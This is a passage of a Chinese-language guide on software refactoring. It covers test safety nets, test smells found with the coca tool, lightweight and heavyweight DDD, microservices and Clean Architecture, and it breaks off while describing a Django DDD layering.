&lt;p&gt;为了&lt;strong&gt;保证对外暴露的 API 好的&lt;/strong&gt;，即我的重构不影响 API 的使用方，我们需要设计一个合适的防护策略。&lt;/p&gt;
&lt;p&gt;在设计的时候，我们采用的是测试金字塔来帮助我们搭建测策略。我们会从下（单元测试）向上（集成测试）一步步搭建测试策略。&lt;/p&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="images/test-primard.png"&gt;&lt;img src="images/test-primard.png" alt="测试金字塔" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;而当我们重构的时候，我们则是自顶向下设计防护策略。常见的测试策略有&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;框架/模式库测试。xUnit，xMock，如 Java 语言里的 JUnit, Mockito；JavaScript 中的 Jest&lt;/li&gt;
&lt;li&gt;端到端 API 测试。JMeter，Postman，Rest Assured，Karate&lt;/li&gt;
&lt;li&gt;UI 集成测试。Protractor&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;考虑到测试即文档，在实现实现的时候，会配合一些支持自然语言描述的框架，如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;文档式测试，Gauge （主流语言），Concordion（Java）&lt;/li&gt;
&lt;li&gt;BDD 测试，Cucumber（主流语言）&lt;/li&gt;
&lt;li&gt;ATDD 测试，Robot Framework（Python 语言）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;为了与运行客户端一配合，我们还需要有底层 API 来控制浏览器、客户端应用：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Appium。移动 APP 和桌面应用，支持主流语言&lt;/li&gt;
&lt;li&gt;Selenium。Web 浏览器，支持主流语言&lt;/li&gt;
&lt;li&gt;Puppeteer。Node.js API 操作 Chrome 浏览器&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;关于 APP 测试方案，可以参考我之前写的《&lt;a href="https://www.phodal.com/blog/phodal-architecture-101-mobile-appllication-test-architecture/" rel="nofollow"&gt;【架构拾集】移动应用的自动化测试（BDD 方式）&lt;/a&gt;》&lt;/p&gt;
&lt;p&gt;根据现有的 E2E（端到端）/集成测试框架的架构，我画了一个大致的测试策略分层架构图：&lt;/p&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="images/test-arch.png"&gt;&lt;img src="images/test-arch.png" alt="测试架构" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;选择适合你们团队的测试架构，然后编写你的第一个测试。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-第一个测试" class="anchor" aria-hidden="true" href="#第一个测试"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;第一个测试&lt;/h3&gt;
&lt;p&gt;这个就简单了：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;选择方案，然后 Google&lt;/li&gt;
&lt;li&gt;寻找最简单的情形，编写测试&lt;/li&gt;
&lt;li&gt;只需要有了第一个，剩下的就是时间问题。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Done！&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-持续集成重构" class="anchor" aria-hidden="true" href="#持续集成重构"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;持续集成重构&lt;/h3&gt;
&lt;p&gt;如果你还没有持续集成环境的话，那么请搭建它。&lt;/p&gt;
&lt;p&gt;考虑到这是一个体力活，而且这方面的资料已经足够的多，我就不浪费大家的时间了。&lt;/p&gt;
&lt;p&gt;顺带一提，如果你的分支比较多，而且构建比较多，那么你可以考虑 &lt;code&gt;pipeline as pipeline&lt;/code&gt; 的方式进行构建。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-检视测试" class="anchor" aria-hidden="true" href="#检视测试"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;检视测试&lt;/h3&gt;
&lt;p&gt;某次代码重构中，我发现代码的测试覆盖率很高，过程中出了一些错误，重构手法不正确是一个问题。但是在重构的过程中，发现有些测试都是没有意义的，所以这让我意思到在构建防护网的时候，有必要审视一遍测试，查找测试代码中的坏味道。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;测试代码坏味道，是指单元测试代码中的不良编程实践（例如，测试用例的组织方式，实现方式以及彼此之间的交互方式），它们表明测试源代码中潜在的设计问题。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;常见的测试坏味道有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;空的测试。测试是生成的，但是没有内容。&lt;/li&gt;
&lt;li&gt;忽略的测试。即测试被 Ignore&lt;/li&gt;
&lt;li&gt;没有断言的测试。为了测试覆盖率而出现的测试&lt;/li&gt;
&lt;li&gt;多余的 Println。调试时留下的讯息。&lt;/li&gt;
&lt;li&gt;多重断言。每个测试函数只应该测试一个概念。&lt;/li&gt;
&lt;li&gt;……&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;有兴趣进一步了解的话，可以阅读《&lt;a href="https://www.phodal.com/blog/test-bad-smell/" rel="nofollow"&gt;测试代码的坏味道&lt;/a&gt;》。&lt;/p&gt;
&lt;p&gt;也可以 &lt;code&gt;coca tbs&lt;/code&gt; 来查找测试中的坏味道：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;TYPE&lt;/th&gt;
&lt;th&gt;FILENAME&lt;/th&gt;
&lt;th&gt;LINE&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;DuplicateAssertTest&lt;/td&gt;
&lt;td&gt;app/test/cc/arduino/i18n/ExternalProcessOutputParserTest.java&lt;/td&gt;
&lt;td&gt;107&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DuplicateAssertTest&lt;/td&gt;
&lt;td&gt;app/test/cc/arduino/i18n/ExternalProcessOutputParserTest.java&lt;/td&gt;
&lt;td&gt;41&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DuplicateAssertTest&lt;/td&gt;
&lt;td&gt;app/test/cc/arduino/i18n/ExternalProcessOutputParserTest.java&lt;/td&gt;
&lt;td&gt;63&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;RedundantPrintTest&lt;/td&gt;
&lt;td&gt;app/test/cc/arduino/i18n/I18NTest.java&lt;/td&gt;
&lt;td&gt;71&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;RedundantPrintTest&lt;/td&gt;
&lt;td&gt;app/test/cc/arduino/i18n/I18NTest.java&lt;/td&gt;
&lt;td&gt;72&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;RedundantPrintTest&lt;/td&gt;
&lt;td&gt;app/test/cc/arduino/i18n/I18NTest.java&lt;/td&gt;
&lt;td&gt;77&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DuplicateAssertTest&lt;/td&gt;
&lt;td&gt;app/test/cc/arduino/net/PACSupportMethodsTest.java&lt;/td&gt;
&lt;td&gt;19&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DuplicateAssertTest&lt;/td&gt;
&lt;td&gt;app/test/processing/app/macosx/SystemProfilerParserTest.java&lt;/td&gt;
&lt;td&gt;51&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DuplicateAssertTest&lt;/td&gt;
&lt;td&gt;app/test/processing/app/syntax/PdeKeywordsTest.java&lt;/td&gt;
&lt;td&gt;41&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DuplicateAssertTest&lt;/td&gt;
&lt;td&gt;app/test/processing/app/tools/ZipDeflaterTest.java&lt;/td&gt;
&lt;td&gt;57&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DuplicateAssertTest&lt;/td&gt;
&lt;td&gt;app/test/processing/app/tools/ZipDeflaterTest.java&lt;/td&gt;
&lt;td&gt;83&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DuplicateAssertTest&lt;/td&gt;
&lt;td&gt;app/test/processing/app/tools/ZipDeflaterTest.java&lt;/td&gt;
&lt;td&gt;109&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;&lt;a id="user-content-系统架构重构" class="anchor" aria-hidden="true" href="#系统架构重构"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;系统架构重构&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;架构将大问题分解为容易处理的小问题。——《架构师修炼之道 》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;重量级 DDD 更多的是结合现状 + 未来出发，更多的人参与，提供准确的信息。&lt;/p&gt;
&lt;p&gt;轻量级 DDD 则是通过现状，只需要少数熟悉的人，没有完成一致的达成，通过&lt;strong&gt;持续性赋能&lt;/strong&gt;改善模型。&lt;/p&gt;
&lt;p&gt;产品线 / 业务线来说，并非每一个子系统都是核心域，也不会投入大量的人和精力在上面。特别是，当你在重构的时候，投入的人员和精力不足以实施一个合理的事件风暴，以完成对应的领域驱动设计活动。所以，我们只能尽可能完善系统的设计。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-高质量级-ddd-重构演进驱动的事件风暴" class="anchor" aria-hidden="true" href="#高质量级-ddd-重构演进驱动的事件风暴"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;高质量级 DDD 重构：演进驱动的事件风暴&lt;/h3&gt;
&lt;p&gt;它意味着，重构时需要有：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;积极专注的团队参与&lt;/li&gt;
&lt;li&gt;复杂的场景&lt;/li&gt;
&lt;li&gt;领域专家参与协作&lt;/li&gt;
&lt;li&gt;迭代式的模型设计&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;为此需要：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;事件风暴&lt;/li&gt;
&lt;li&gt;识别上下文&lt;/li&gt;
&lt;li&gt;梳理上下文关系&lt;/li&gt;
&lt;li&gt;划分问题子域&lt;/li&gt;
&lt;li&gt;识别弹性边界&lt;/li&gt;
&lt;li&gt;领域建模&lt;/li&gt;
&lt;li&gt;分层架构&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;对应的我们需要：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;重搭架构&lt;/li&gt;
&lt;li&gt;编写集成测试&lt;/li&gt;
&lt;li&gt;搬移代码&lt;/li&gt;
&lt;li&gt;……&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;考虑到其复杂性，我建议采用《事件风暴设计工作坊》来完成相关的流程。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-轻量级-ddd-重构现状驱动的领域方案" class="anchor" aria-hidden="true" href="#轻量级-ddd-重构现状驱动的领域方案"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;轻量级 DDD 重构：现状驱动的领域方案&lt;/h3&gt;
&lt;p&gt;有意思的一个现象是，在真正落地的时候，对于核心的系统往往会抱着比较谨慎的态度 —— 除非原来的模式真的有问题。又或者是，所处的部门不是系统的核心部门时，在投入在会出现一定的问题。&lt;/p&gt;
&lt;p&gt;看图：&lt;/p&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="images/quick-ddd.png"&gt;&lt;img src="images/quick-ddd.png" alt="Quick ES" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;相应的步骤如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;结合工具识别所有的接口&lt;/li&gt;
&lt;li&gt;通过接口识别出领域名词（聚合、实体等）&lt;/li&gt;
&lt;li&gt;分析接口设计是否合理&lt;/li&gt;
&lt;li&gt;通过领域名词划分上下文边界&lt;/li&gt;
&lt;li&gt;重新定义领域名词&lt;/li&gt;
&lt;li&gt;结合领域名词划分新的 API&lt;/li&gt;
&lt;li&gt;划分领域和分层架构&lt;/li&gt;
&lt;li&gt;重新划分分层架构&lt;/li&gt;
&lt;li&gt;重构 service 代码，剥离领域逻辑&lt;/li&gt;
&lt;li&gt;重构代码到领域模型&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;对于未采用 Swagger 等 API 管理工具的项目，可以通过 &lt;code&gt;coca api&lt;/code&gt; 生成 API 列表：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GET   /aliyun/oss/policy                
POST  /aliyun/osscallback               
GET   /subject/list                     
GET   /esProduct/search                 
GET   /order/list                       
GET   /productAttribute/list/{cid}      
GET   /productCategory/list/{parentId}  
GET   /brand/list                       
GET   /esProduct/search/simple          
...
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;&lt;a id="user-content-限界上下文要素" class="anchor" aria-hidden="true" href="#限界上下文要素"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;限界上下文要素&lt;/h3&gt;
&lt;p&gt;包含相关上下文的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;实体，只要一个对象在生命周期中能够保持连续性，并且独立于它的属性（即使这些属性对系统用户非常重要），那它就是一个实体。它具有唯一标识和生命周期。&lt;/li&gt;
&lt;li&gt;值对象，当你只关心某个对象的属性时，该对象便可作为一个值对象。它是实体的附加业务概念，用来描述实体所包含的业务信息。&lt;/li&gt;
&lt;li&gt;领域服务（domain service）。封装了没有在模型中自然建模为值对象或实体的领域逻辑和概念。它的主要职责是使用实现和值对象编排业务逻辑。&lt;/li&gt;
&lt;li&gt;领域事件（domain event）。它用于表明问题域中发生了一些业务人员关心的事情。在命名领域事件时，我们往往选择动词的过去分词，以明确表达事件的属性，其中文形式往往是『XXX已YYY』。&lt;/li&gt;
&lt;li&gt;资源库（repository）。公开聚合根在内存中的集合的接口，提供聚合根的检索和持久化需要。&lt;/li&gt;
&lt;li&gt;工厂（factory）。即在实体或者值对象创建复杂时，可以委托给工厂（模式）进行创建。。&lt;/li&gt;
&lt;li&gt;聚合（aggregate）。是一种边界内的领域对象的集群，可以将其视为一个单元。可以封装一个到多个实体与值对象，用来维护该边界范围之内的业务完整性。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-微服务重构" class="anchor" aria-hidden="true" href="#微服务重构"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;微服务重构&lt;/h3&gt;
&lt;p&gt;一旦涉及到对微服务进行重构的时候，我们有很大的可能性要对系统进行 API 的重构设计。它也意味着，我们可能会影响到 API 的使用方，如果 API 也是自己内部的系统，那么问题就不是太大；如果 API 的使用方是第三方团队的系统时，我们就需要考虑一下兼容方案。这种兼容方案会在一定程度上影响到我们的重构，甚至于我们有可能不对做这方面的重构。&lt;/p&gt;
&lt;p&gt;重构到微服务是一个巨大的挑战。&lt;/p&gt;
&lt;p&gt;微服务是一个生态系统，它需要大量的基础设施进行配合，如部署管道、服务发现、日志和监控、负责均衡等。&lt;/p&gt;
&lt;p&gt;如果团队本身没有相关的经验，并且尝试往上调整的话，那么需要在心理上做好大量的准备。&lt;/p&gt;
&lt;p&gt;如果你的目标是重构到微服架构，那么我建议你先重构到 DDD + 整洁架构，它是微服务架构的一个中间态。即，先看看容器架构重构。&lt;/p&gt;
&lt;h3&gt;&lt;a id="" class="anchor" aria-hidden="true" href="#"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;……&lt;/h3&gt;
&lt;p&gt;待定。&lt;/p&gt;
&lt;p&gt;由于笔者在这方面的经验不是非常丰富，但是我知道这里仍然有非常多的内容，可以探索。&lt;/p&gt;
&lt;p&gt;欢迎大家来 pull request。&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-服务架构重构" class="anchor" aria-hidden="true" href="#服务架构重构"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;服务架构重构&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;小步前进，拉一下最新的代码。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我在设计之初，想把标题改为容器架构重构，它对应上 C4 模型。纠结之后，我还是改为了服务架构。可见，命名之难。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-整洁架构" class="anchor" aria-hidden="true" href="#整洁架构"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;整洁架构&lt;/h3&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="images/full-clean-architecture.png"&gt;&lt;img src="images/full-clean-architecture.png" alt="整洁架构" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Robert C. Martin 总结了六边形架构（即端口与适配器架构）、DCI （Data-Context-Interactions，数据-场景-交互）架构、BCI（Boundary Control Entity，Boundary Control Entity）架构等多种架构，归纳出了这些架构的基本特点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;框架无关性。系统不依赖于框架中的某个函数，框架只是一个工具，&lt;strong&gt;系统不能适应于框架&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;可被测试。业务逻辑脱离于 UI、数据库等外部元素进行测试。&lt;/li&gt;
&lt;li&gt;UI 无关性。不需要修改系统的其它部分，就可以变更 UI，诸如由 Web 界面替换成 CLI。&lt;/li&gt;
&lt;li&gt;数据库无关性。业务逻辑与数据库之间需要进行解耦，我们可以随意切换 LocalStroage、IndexedDB、Web SQL。&lt;/li&gt;
&lt;li&gt;外部机构（agency）无关性。系统的业务逻辑，不需要知道其它外部接口，诸如安全、调度、代理等。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如图所示 Clean Architecture 一共分为四个环，四个层级。环与环之间，存在一个依赖关系原则：&lt;strong&gt;源代码中的依赖关系，必须只指向同心圆的内层，即由低层机制指向高级策略&lt;/strong&gt;。其类似于 SOLID 中的依赖倒置原则：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;高层模块不应该依赖低层模块，两者都应该依赖其抽象&lt;/li&gt;
&lt;li&gt;抽象不应该依赖细节，细节应该依赖抽象&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;与此同时，四个环都存在各自核心的概念：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;实体 Entities （又称领域对象或业务对象，实体用于封装企业范围的业务规则）&lt;/li&gt;
&lt;li&gt;用例 Use Cases（交互器，用例是特定于应用的业务逻辑）&lt;/li&gt;
&lt;li&gt;接口适配器 Interface Adapters （接口适配器层的主要作用是转换数据）&lt;/li&gt;
&lt;li&gt;框架和驱动（Frameworks and Drivers），最外层由各种框架和工具组成，比如 Web 框架、数据库访问工具等
这个介绍可能有些简单，让我复制/粘贴一下更详细的解释：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;实体（Entities）&lt;/strong&gt;，实体用于封装企业范围的业务规则。实体可以是拥有方法的对象，也可以是数据结构和函数的集合。如果没有企业，只是单个应用，那么实体就是应用里的业务对象。这些对象封装了最通用和高层的业务规则，极少会受到外部变化的影响。任何操作层面的改动都不会影响到这一层。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;用例（Use Cases）&lt;/strong&gt;，用例是特定于应用的业务逻辑，一般用来完成用户的某个操作。用例协调数据流向或者流出实体层，并且在此过程中通过执行实体的业务规则来达成用例的目标。用例层的改动不会影响到内部的实体层，同时也不会受外层的改动影响，比如数据库、UI 和框架的变动。只有而且应当应用的操作发生变化的时候，用例层的代码才随之修改。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;接口适配器（Interface Adapters）&lt;/strong&gt;。接口适配器层的主要作用是转换数据，数据从最适合内部用例层和实体层的结构转换成适合外层（比如数据持久化框架）的结构。反之，来自于外部服务的数据也会在这层转换为内层需要的结构。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;框架和驱动（Frameworks and Drivers）&lt;/strong&gt;。最外层由各种框架和工具组成，比如 Web 框架、数据库访问工具等。通常在这层不需要写太多代码，大多是一些用来跟内层通信的胶水代码。这一层包含了所有实现细节，把实现细节锁定在这一层能够减少它们的改动对整个系统造成的伤害。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-设计新架构" class="anchor" aria-hidden="true" href="#设计新架构"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;设计新架构&lt;/h3&gt;
&lt;p&gt;根据不同项目的实际情况，在真正落地的时候，会存在一些细微的差距。&lt;/p&gt;
&lt;p&gt;如我的同事 &lt;a href="https://github.com/huleTW"&gt;@huleTW&lt;/a&gt; 在 &lt;a href="https://github.com/huleTW/django-ddd-demo"&gt;django-ddd-demo&lt;/a&gt; 项目中使用的 Python + Django 下的 DDD 分层架构如下所示：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;apis&lt;/strong&gt;：放各种 url 的 dispatcher&lt;/li&gt;
